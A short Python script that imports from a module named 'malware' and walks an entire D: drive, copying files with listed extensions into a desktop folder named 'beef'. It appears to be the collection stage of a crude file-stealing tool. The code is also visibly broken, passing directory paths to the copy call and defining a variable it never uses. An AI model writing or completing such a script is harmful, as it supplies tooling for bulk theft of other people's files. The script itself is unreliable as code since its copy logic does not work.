import shutil
from malware import*
import os
the_dir = r'E:\\';
for dirpath , dirname , filenames in os.walk(r'D:\\'):
        for file in filenames:
            if file.endswith(tuple(ex_list)):
                try:
                    shutil.copyfile(dirpath , r'C:\Users\USER\Desktop\beef')
                except FileNotFoundError :
                    pass




